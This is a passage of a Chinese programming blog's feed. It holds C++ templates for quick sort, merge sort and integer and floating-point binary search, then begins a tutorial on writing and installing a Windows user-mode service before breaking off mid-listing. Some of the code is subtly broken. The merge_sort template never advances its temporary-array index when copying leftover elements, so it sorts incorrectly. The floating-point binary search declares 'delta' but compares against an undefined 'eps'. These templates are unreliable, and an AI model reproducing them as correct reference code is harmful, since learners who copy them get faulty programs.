class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">quick_sort</span><span class="params">(<span class="keyword">int</span> A[], <span class="keyword">int</span> lo, <span class="keyword">int</span> hi)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 当数组中只有1个或0个元素时，不需要进行排序，直接返回就好</span></span><br><span class="line">    <span class="keyword">if</span> (lo &gt;= hi) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 指向两个哨兵节点，避免漏过数据</span></span><br><span class="line">    <span class="keyword">int</span> left = lo - <span class="number">1</span>, right = hi + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> pivot = A[(lo + hi) &gt;&gt; <span class="number">1</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 两个指针还没有相遇或者穿过</span></span><br><span class="line">    <span class="keyword">while</span> (left &lt; right) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">do</span> </span><br><span class="line">        &#123;</span><br><span class="line">            left++;</span><br><span class="line">        &#125; <span class="keyword">while</span> (A[left] &lt; pivot);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">do</span> </span><br><span class="line">        &#123;</span><br><span class="line">            right--;</span><br><span class="line">        &#125; <span class="keyword">while</span> (A[right] &gt; pivot);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// left和right指针还未相遇</span></span><br><span class="line">        <span class="keyword">if</span> (left &lt; right)</span><br><span class="line">        &#123;</span><br><span class="line">            std::<span class="built_in">swap</span>(A[left], A[right]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="built_in">quick_sort</span>(A, lo, right);</span><br><span class="line">    <span class="built_in">quick_sort</span>(A, right + <span class="number">1</span>, hi);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="归并排序">归并排序</h2><h3 id="基本思想-2">基本思想</h3><p>同快速排序一样，是分治思想。</p><ol><li>确定分界点下标。</li><li>先递归排序左边和右边。这样得到了一系列的有序数组列。</li><li>两两归并为有序数组直到只剩一个数组。</li></ol><h3 id="归并排序中的重点和难点">归并排序中的重点和难点</h3><p>在于归并，即：如何将两个有序的序列合二为一。其实就是比较两个指针指向的两者中的较小者，放到新的一个数组中，直到合并完。</p><p>由于左侧的指针只会扫描左半边，右侧的指针只会扫描右半边。故：两两归并的时间复杂度是O(N)的。</p><p>对于归并排序，其每次都要两两二分，从而期望划分为 <img src="https://math.now.sh?inline=log_2N" style="display:inline-block;margin: 0;"/> 次，每次合并的时间复杂度是O(N)，故最终的时间复杂度是：<code>O(NlogN)</code></p><h3 id="归并排序的一种模板">归并排序的一种模板</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">merge_sort</span><span class="params">(<span class="keyword">int</span> A[], <span class="keyword">int</span> lo, <span class="keyword">int</span> hi)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 当数组中只有1个或0个元素时，不需要进行排序，直接返回就好 </span></span><br><span class="line">    <span class="keyword">if</span> (lo &gt;= hi)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 划分区间</span></span><br><span class="line">    <span class="keyword">int</span> mid = (lo + hi) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// 递归排序两边</span></span><br><span class="line">    <span class="built_in">merge_sort</span>(A, lo, mid);</span><br><span class="line">    <span class="built_in">merge_sort</span>(A, mid + <span class="number">1</span>, hi);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 合并两个有序数组到临时数组中</span></span><br><span class="line">    <span class="keyword">int</span> left = lo, right = mid + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> tmp_ary_idx = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (left &lt;= mid &amp;&amp; right &lt;= hi)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (A[left] &lt;= A[right])</span><br><span class="line">        &#123;</span><br><span class="line">            tmp_ary[tmp_ary_idx] = A[left];</span><br><span class="line">           ++left;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            tmp_ary[tmp_ary_idx] = A[right];</span><br><span class="line">            ++right;</span><br><span class="line">        &#125;</span><br><span class="line">        ++tmp_ary_idx;</span><br><span class="line">    &#125; </span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 将剩余的部分放到临时数组中</span></span><br><span class="line">    <span class="keyword">while</span> (left &lt;= mid)</span><br><span class="line">    &#123;</span><br><span class="line">        tmp_ary[tmp_ary_idx] = A[left];</span><br><span class="line">        ++left;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> (right &lt;= hi)</span><br><span class="line">    &#123;</span><br><span class="line">        tmp_ary[tmp_ary_idx] = A[right];</span><br><span class="line">        ++right;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 将临时数组中的数据拷贝到原数组</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = lo, j = <span class="number">0</span>; i &lt;= hi; ++i, ++j)</span><br><span class="line">    &#123;</span><br><span class="line">        A[i] = tmp_ary[j];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1>二分法</h1><h2 id="整数二分">整数二分</h2><h3 id="问题的本质">问题的本质</h3><p>二分法与数据的单调性没什么必然的联系，如果要说有的话，那么就是如果数据具有单调性，那么就一定可以二分。但是可以二分的题目，不一定非得要求有单调性。</p><p>本质其实是边界。我们定义一个性质，使得在所给数据集上的左半边满足这个性质，另一半不满足这个性质。如果可以找到这个性质的话，可以把数据一分为二，<strong>那么二分就可以寻找到这个性质的边界（两个分界点都可以找到）</strong>。</p><h3 id="寻找左侧部分的边界点（左侧部分的终点）">寻找左侧部分的边界点（左侧部分的终点）</h3><p>步骤：</p><ol><li>找到其中间点，<code>mid = (left + right + 1) / 2</code> ，注意要加1</li><li>检查这个中间点是否满足所给性质（即：左侧部分数据应该满足的性质）<code>if(check(mid))</code><ul><li>如果是<code>true</code>，则<code>mid</code>一定在左侧部分，分界点（答案）应该在右半区间，所以应该将<code>left = mid</code> ，其答案区间应该是：<code>[mid, right]</code>，注意是闭区间。</li><li>如果是<code>false</code>，则<code>mid</code>一定在右侧部分，分界点（答案）应该在左半区间，所以应该将<code>right = mid - 1</code>，其答案区间应该是：<code>[left, mid - 1]</code>，注意是闭区间。（为什么是<code>mid-1</code>？因为<code>mid</code>是一定不满足所给性质的，所以可以将<code>mid</code>给排除掉了）</li></ul></li></ol><h3 id="寻找右侧部分的边界点（右侧部分的起始点）">寻找右侧部分的边界点（右侧部分的起始点）</h3><p>步骤：</p><ol><li>找到其中间点，<code>mid = (left + right) / 2</code></li><li>检查中间点是否满足所给性质（即：右侧部分数据应该满足的性质）<ul><li>如果是<code>true</code>，则<code>mid</code>一定在左侧部分，分界点（答案）应该在左半区间，所以应该将<code>right = mid</code> ，其答案区间应该是：<code>[left, mid]</code>，注意是闭区间。（因为mid满足所给性质，所以其答案还是可能在mid这点上的）</li><li>如果是<code>false</code>，则<code>mid</code>一定在右侧部分，分界点（答案）应该在右半区间，所以应该将<code>left = mid + 1</code>，其答案区间应该是：<code>[mid + 1, right]</code>，注意是闭区间。（为什么是<code>mid+1</code>？因为<code>mid</code>是一定不满足所给性质的，所以可以将<code>mid</code>给排除掉了）</li></ul></li></ol><h3 id="如何选择使用哪个方法">如何选择使用哪个方法</h3><p>步骤：</p><ol><li>先写一个<code>check</code> 函数</li><li>想一下这个<code>check(mid)</code>函数是true或者false的时候如何更新</li><li>如果更新方式是<code>left = mid</code> 和 <code>right = mid - 1</code>，则需要在计算mid时，补上分子的那个1（即：取上整）</li></ol><p>其实核心就是看更新区间到底是<code>left = mid</code> 还是<code>right = mid</code>（在check为<code>true</code>的情况下），如果是<code>left = mid</code> ，则需要mid取上整，需要补偿加1，否则不需要补偿加1.</p><p>需要注意的是，定义一个性质之后，其二分一定是有解的（即：一定有一个边界），但是题目是不一定有解的。</p><h3 id="为什么当check为真时left-mid要补偿加1">为什么当check为真时<code>left = mid</code>要补偿加1</h3><p>当left和right只差1的时候，如果mid不补偿加1的话，那么mid下取整是等于left的，如果此时check为true的，则left还是等于left，此时没有进行更新，从而会出现死循环的情况。</p><h3 id="整数二分的模板">整数二分的模板</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 用来检查var是否符合某一性质</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">check</span><span class="params">(<span class="keyword">int</span> var)</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 区间[left, right]被划分为[left, mid]和[mid + 1, right]时使用</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">binary_search</span><span class="params">(<span class="keyword">int</span> left, <span class="keyword">int</span> right)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (left &lt; right)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> mid = (left + right) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">check</span>(mid) == <span class="literal">true</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            right = mid;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            left = mid + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> left;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 区间[left, right]被划分为[left, mid - 1]和[mid, right]时使用</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">binary_search</span><span class="params">(<span class="keyword">int</span> left, <span class="keyword">int</span> right)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (left &lt; right)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> mid = (left + right + <span class="number">1</span>) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">check</span>(mid) == <span class="literal">true</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            left = mid;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            right = mid - <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> left;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="浮点数二分">浮点数二分</h2><p>这里面就不需要考虑是否需要补偿了，直接就可以二分更新即可。</p><h3 id="浮点数二分模板">浮点数二分模板</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 用来检查var是否符合某一性质</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">check</span><span class="params">(<span class="keyword">double</span> var)</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">binary_search</span><span class="params">(<span class="keyword">double</span> left, <span class="keyword">double</span> right)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 经验值：精度控制比题目所给的精度高-2即可，如：题目要求保留4位，则精度为1e-6即可</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">double</span> delta = <span class="number">1e-6</span>;   </span><br><span class="line">    <span class="keyword">while</span> (right - left &gt; eps)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">double</span> mid = (left + right) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">check</span>(mid)) </span><br><span class="line">        &#123;</span><br><span class="line">            right = mid;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">        &#123;</span><br><span class="line">            left = mid;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> left;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;大纲&lt;/h1&gt;
&lt;p&gt;排序：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;快速排序&lt;/li&gt;
&lt;li&gt;归并排序&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;二分：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;整数二分&lt;/li&gt;
&lt;li&gt;浮点数二分&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;学习方法：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;学习代码的</summary>
      
    
    
    
    <category term="算法" scheme="https://4st.tech/categories/%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="快速排序" scheme="https://4st.tech/tags/%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F/"/>
    
    <category term="排序" scheme="https://4st.tech/tags/%E6%8E%92%E5%BA%8F/"/>
    
    <category term="归并排序" scheme="https://4st.tech/tags/%E5%BD%92%E5%B9%B6%E6%8E%92%E5%BA%8F/"/>
    
    <category term="二分" scheme="https://4st.tech/tags/%E4%BA%8C%E5%88%86/"/>
    
    <category term="整数二分" scheme="https://4st.tech/tags/%E6%95%B4%E6%95%B0%E4%BA%8C%E5%88%86/"/>
    
    <category term="浮点数二分" scheme="https://4st.tech/tags/%E6%B5%AE%E7%82%B9%E6%95%B0%E4%BA%8C%E5%88%86/"/>
    
  </entry>
  
  <entry>
    <title>Windows下Ring3环服务的创建和使用</title>
    <link href="https://4st.tech/2021/04/26/ring3-huan-fu-wu-de-chuang-jian-he-shi-yong/"/>
    <id>https://4st.tech/2021/04/26/ring3-huan-fu-wu-de-chuang-jian-he-shi-yong/</id>
    <published>2021-04-26T07:45:22.000Z</published>
    <updated>2021-08-04T04:57:02.775Z</updated>
    
    <content type="html"><![CDATA[<h1>服务</h1><p>是没有<code>UI</code>界面的程序，它要长期驻扎在后台的服务程序，任何用户都可以调用他提供的服务。</p><p>如打印机，我不挑程序，什么文档编辑的程序都可以使用我这台打印机来打印。他不需要<code>UI</code>之类的，你需要打印东西，就把你要打印的数据给我，我去让打印机打印就行了，所以就特别适合写成服务。</p><p>什么时候使用服务程序？</p><ul><li>需要长期在后台运行的程序（无UI需求）</li><li>为系统所有程序提供服务</li></ul><h1>服务的创建与使用</h1><h2 id="服务的创建">服务的创建</h2><p>可以先创建一个控制台应用程序，然后在<code>main</code> 函数中做以下操作：</p><ul><li>填充<code>DispatchTable</code> 结构体数组，其每个成员是<code>SERVICE_TABLE_ENTRY</code> 类型，以<code>NULL, NULL</code> 结尾，标志该结构体数组结束<ul><li>第一个结构体的数据成员是服务名</li><li>第二个结构体的数据成员是服务的入口函数<code>SvcMain</code></li></ul></li><li>调用 <code>StartServiceCtrlDispatcher</code> 将控制台的入口函数转换到服务程序的入口函数处</li></ul><p>在服务的入口函数<code>SvcMain</code> 中需要做：</p><ul><li>通过<code>RegisterServiceCtrlHandler</code> 函数注册服务，传入服务控制函数的函数指针，其相当于消息循环的调度器。当有服务请求时，通过控制码就可以通过控制码来进行相应的操作</li><li>通过<code>CreateEvent</code> 创建一个事件，当发来请求需要将服务状态设置为停止状态，需要退出服务，因此需要事件来进行同步</li><li>将状态设置为运行状态，通过<code>SetServiceStatus</code> 设置</li></ul><p>示例代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> WINAPI <span class="title">SvcMain</span><span class="params">(DWORD argc, LPTSTR* argv)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">OutputDebugString</span>(<span class="string">&quot;[51asm] SvcMain&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//注册服务控制处理</span></span><br><span class="line">  gSvcStatusHandle = <span class="built_in">RegisterServiceCtrlHandler</span>(SVCNAME, SvcCtrlHandler);</span><br><span class="line">  <span class="keyword">if</span> (!gSvcStatusHandle) &#123;</span><br><span class="line">    <span class="built_in">OutputDebugString</span>(<span class="string">&quot;[51asm] 注册控制处理失败&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  gSvcStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;</span><br><span class="line">  gSvcStatus.dwServiceSpecificExitCode = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">ReportSvcStatus</span>(SERVICE_START_PENDING, NO_ERROR, <span class="number">3000</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">SvcInit</span>(argc, argv);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//设置服务当前状态</span></span><br><span class="line"><span class="function">VOID <span class="title">ReportSvcStatus</span><span class="params">(DWORD dwCurrentState,DWORD dwWin32ExitCode, DWORD dwWaitHint)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">static</span> DWORD dwCheckPoint = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  gSvcStatus.dwCurrentState = dwCurrentState;</span><br><span class="line">  gSvcStatus.dwWin32ExitCode = dwWin32ExitCode;</span><br><span class="line">  gSvcStatus.dwWaitHint = dwWaitHint;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (dwCurrentState == SERVICE_START_PENDING)</span><br><span class="line">    gSvcStatus.dwControlsAccepted = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">else</span> gSvcStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((dwCurrentState == SERVICE_RUNNING) ||</span><br><span class="line">    (dwCurrentState == SERVICE_STOPPED))</span><br><span class="line">    gSvcStatus.dwCheckPoint = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">else</span> gSvcStatus.dwCheckPoint = dwCheckPoint++;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//设置服务状态</span></span><br><span class="line">  <span class="built_in">SetServiceStatus</span>(gSvcStatusHandle, &amp;gSvcStatus);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//服务控制处理函数</span></span><br><span class="line"><span class="function">VOID WINAPI <span class="title">SvcCtrlHandler</span><span class="params">(DWORD dwCtrl)</span> </span>&#123;</span><br><span class="line">  <span class="built_in"><span class="keyword">switch</span></span> (dwCtrl) &#123;</span><br><span class="line">  <span class="keyword">case</span> SERVICE_CONTROL_STOP:</span><br><span class="line">    <span class="built_in">ReportSvcStatus</span>(SERVICE_STOP_PENDING, NO_ERROR, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">SetEvent</span>(ghSvcStopEvent);</span><br><span class="line">    <span class="built_in">ReportSvcStatus</span>(gSvcStatus.dwCurrentState, NO_ERROR, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">OutputDebugString</span>(<span class="string">&quot;[51asm] 服务被停止&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">case</span> SERVICE_CONTROL_INTERROGATE:</span><br><span class="line">    <span class="built_in">OutputDebugString</span>(<span class="string">&quot;[51asm] 服务操作&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">default</span>:</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">SvcInit</span><span class="params">(DWORD dwArgc, LPTSTR* lpszArgv)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">OutputDebugString</span>(<span class="string">&quot;[51asm] SvcInit&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//创建事件对象</span></span><br><span class="line">  ghSvcStopEvent = <span class="built_in">CreateEvent</span>(</span><br><span class="line">                              <span class="literal">NULL</span>,    <span class="comment">// default security attributes</span></span><br><span class="line">                              TRUE,    <span class="comment">// manual reset event</span></span><br><span class="line">                              FALSE,   <span class="comment">// not signaled</span></span><br><span class="line">                              <span class="literal">NULL</span>);   <span class="comment">// no name</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ghSvcStopEvent == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">ReportSvcStatus</span>(SERVICE_STOPPED, NO_ERROR, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//将状态设置为运行状态</span></span><br><span class="line">  <span class="built_in">ReportSvcStatus</span>(SERVICE_RUNNING, NO_ERROR, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(ghSvcStopEvent, INFINITE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//将服务状态设置为停止状态</span></span><br><span class="line">    <span class="built_in">ReportSvcStatus</span>(SERVICE_STOPPED, NO_ERROR, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">OutputDebugString</span>(<span class="string">&quot;[51asm] SvcInit return&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span>  <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">  <span class="comment">//将控制台程序转换为服务程序</span></span><br><span class="line">  SERVICE_TABLE_ENTRY DispatchTable[] =</span><br><span class="line">  &#123;</span><br><span class="line">      &#123; (LPSTR)SVCNAME, (LPSERVICE_MAIN_FUNCTION)SvcMain &#125;,</span><br><span class="line">      &#123; <span class="literal">NULL</span>, <span class="literal">NULL</span> &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="built_in">StartServiceCtrlDispatcher</span>(DispatchTable);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="服务的加载">服务的加载</h2><p>如果一个程序是 <code>ServiceMain</code> ，他就是一个服务程序。需要使用 <code>CreateService</code> 安装、 <code>StartServce</code> 开始、 <code>ControlService</code> 控制服务停止、 <code>DeleteService</code> 就是卸载服务。</p><p><code>CreateService</code> 来安装服务，其就是在注册表创建一个注册表选项。在调用安装等操作之前，需要创建服务管理器，让有权限的对象来进行这些操作，来提高安全性。</p><p>需要注意的是：得到的服务管理器对象的句柄和通过<code>CreateService</code> 等得到的服务对象的句柄需要关闭。</p><p>代码示例：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span 